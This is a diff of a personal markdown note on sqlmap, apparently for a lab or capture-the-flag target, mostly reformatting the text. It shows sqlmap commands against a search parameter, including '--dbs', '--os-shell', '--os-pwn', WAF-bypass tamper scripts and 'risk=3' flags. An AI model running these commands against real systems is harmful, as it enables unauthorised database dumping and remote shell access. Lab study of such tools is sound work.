@@ -1,12 +1,10 @@
 # sqlmap
 
-**Author:** Julien Bongars\
-**Date:** 2025-09-20 17:29:29
-**Path:**
+Author: Julien Bongars
+Date: 2025-09-20 17:29:29
+Path: /opt/development/cybersec/hacklas/notes/enumeration/sql/sqlmap.md
 
 ---
-
-Detect and dump SQL injection; `--os-shell` if the DBMS allows it.
 
 ## Basic SQLMap Usage
 
@@ -28,8 +26,7 @@ For GET parameter (your case):
 bashsqlmap -u "http://10.129.228.235/dashboard.php?search=*" --dbs
 ```
 
-## Common SQLMap Options
-
+Common SQLMap Options
 Get current database:
 
 ```bash
@@ -56,15 +53,11 @@ bashsqlmap -u "http://10.129.228.235/dashboard.php?search=*" --os-shell
 
 ## Useful Flags
 
-**`--batch`** — Don't ask for user input, use defaults
-
-**`--level=5`** — More thorough testing
-
-**`--risk=3`** — More aggressive payloads
-
-**`--tamper=space2comment`** — Bypass WAF filters
-
-**`--os-shell`** — start a reverse shell on the target server
+--batch - Don't ask for user input, use defaults
+--level=5 - More thorough testing
+--risk=3 - More aggressive payloads
+--tamper=space2comment - Bypass WAF filters
+--os-shell - start a reverse shell on the target server
 
 ## Request as curl
 
@@ -115,7 +108,7 @@ sqlmap -u "http://10.129.228.235/dashboard.php?search=*" \
 Capture the request in Burp Suite
 Right-click → "save item"
 
-### Save Item
+#### Save Item
 
 ```xml
 <?xml version="1.0"?>
@@ -182,8 +175,3 @@ sqlmap -r request.txt --os-pwn
 
 # haven't figured a way to get a reverse shell for now aside from direct SQL injection. See notes
 ```
-
-## Resources
-
-- [sqlmap](https://sqlmap.org/) — project
-- [sqlmap GitHub](https://github.com/sqlmapproject/sqlmap) — `-r`, tamper, `--os-shell`
